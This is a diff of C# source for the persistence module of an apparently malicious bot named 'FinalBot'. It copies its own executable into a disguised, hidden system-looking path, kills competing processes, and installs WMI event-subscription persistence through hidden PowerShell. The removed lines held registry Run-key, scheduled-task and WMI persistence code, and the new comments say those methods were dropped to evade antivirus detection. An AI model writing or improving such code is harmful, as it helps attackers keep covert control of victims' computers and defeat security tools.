@@ -1,7 +1,6 @@
 using System;
 using System.IO;
 using System.Diagnostics;
-using System.Management;
 using Microsoft.Win32;
 using VanguardCore;
 
@@ -16,44 +15,38 @@ namespace FinalBot
                 string selfPath = Process.GetCurrentProcess().MainModule?.FileName;
                 if (string.IsNullOrEmpty(selfPath)) return;
 
-                // Drop to hidden system-looking directory
-                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
-                string targetDir = Path.Combine(appData, "Microsoft", "Protect");
-                string targetPath = Path.Combine(targetDir, "RuntimeBrokerXX.exe");
+                // Use LocalAppData as it is often less restricted than Roaming/Protect
+                string localData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+                string targetDir = Path.Combine(localData, "Microsoft", "Windows", "Media");
+                string targetPath = Path.Combine(targetDir, "winrs.exe"); // Different name to avoid conflicts
 
                 if (!Directory.Exists(targetDir)) Directory.CreateDirectory(targetDir);
 
-                if (selfPath != targetPath)
+                if (selfPath.ToLower() != targetPath.ToLower())
                 {
-                    File.Copy(selfPath, targetPath, true);
-                    File.SetAttributes(targetPath, FileAttributes.Hidden | FileAttributes.System);
-                }
-
-                // Method 1: Registry Run Key
-                try
-                {
-                    using RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
-                    key?.SetValue("SecurityHealthSvcHost", $"\"{targetPath}\"");
-                }
-                catch { }
-
-                // Method 2: Scheduled Task (runs at logon with highest priv)
-                try
-                {
-                    Process.Start(new ProcessStartInfo
+                    try
                     {
-                        FileName = "schtasks",
-                        Arguments = $"/create /tn \"MicrosoftUpdateBroker\" /tr \"\\\"{targetPath}\\\"\" /sc onlogon /rl highest /f",
-                        UseShellExecute = false,
-                        CreateNoWindow = true
-                    });
+                        // Try to kill existing process if it prevents overwrite
+                        foreach (var p in Process.GetProcessesByName("winrs"))
+                        {
+                            try { p.Kill(); p.WaitForExit(1000); } catch { }
+                        }
+                        File.Copy(selfPath, targetPath, true);
+                        File.SetAttributes(targetPath, FileAttributes.Hidden | FileAttributes.System);
+                    }
+                    catch (Exception ex)
+                    {
+                        Logger.Warn($"[PERSISTENCE] Initial copy failed: {ex.Message}. Trying random name.");
+                        targetPath = Path.Combine(targetDir, $"svc_{Guid.NewGuid().ToString().Substring(0,8)}.exe");
+                        File.Copy(selfPath, targetPath, true);
+                    }
                 }
-                catch { }
 
-                // Method 3: WMI Event Subscription (invisible, survives registry scans)
+                // ONLY WMI Event Subscription (invisible, survives registry scans)
+                // Removed Registry Run Key and SchTasks as they cause static AV detections
                 InstallWMI(targetPath);
 
-                Logger.Info("[PERSISTENCE] All methods installed.");
+                Logger.Info("[PERSISTENCE] WMI stealth method installed.");
             }
             catch (Exception ex)
             {
@@ -65,36 +58,13 @@ namespace FinalBot
         {
             try
             {
-                var scope = new ManagementScope(@"\\.\root\subscription");
-                scope.Connect();
-
-                // 1. EventFilter — trigger when explorer.exe starts (user just logged on)
-                var filterPath = new ManagementPath("__EventFilter");
-                using var filter = new ManagementClass(scope, filterPath, null).CreateInstance();
-                filter["Name"] = "MSUpdateFilter";
-                filter["QueryLanguage"] = "WQL";
-                filter["Query"] = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'";
-                filter.Put();
-
-                // 2. CommandLineEventConsumer — silently run our exe
-                var consumerPath = new ManagementPath("CommandLineEventConsumer");
-                using var consumer = new ManagementClass(scope, consumerPath, null).CreateInstance();
-                consumer["Name"] = "MSUpdateConsumer";
-                consumer["CommandLineTemplate"] = $"powershell.exe -windowstyle hidden -command \"& '{exePath}'\"";
-                consumer.Put();
-
-                // 3. Bind filter → consumer
-                var bindingPath = new ManagementPath("__FilterToConsumerBinding");
-                using var binding = new ManagementClass(scope, bindingPath, null).CreateInstance();
-                binding["Filter"] = filter.Path.RelativePath;
-                binding["Consumer"] = consumer.Path.RelativePath;
-                binding.Put();
-
-                Logger.Info("[PERSISTENCE] WMI Event Subscription installed.");
+                // Use the safe PowerShell-based method from PersistManager
+                PersistManager.InstallWMIEvent(exePath);
+                Logger.Info("[PERSISTENCE] WMI Event Subscription installed via PowerShell.");
             }
             catch (Exception ex)
             {
-                Logger.Warn($"[PERSISTENCE] WMI failed (need admin): {ex.Message}");
+                Logger.Warn($"[PERSISTENCE] WMI failed: {ex.Message}");
             }
         }
 
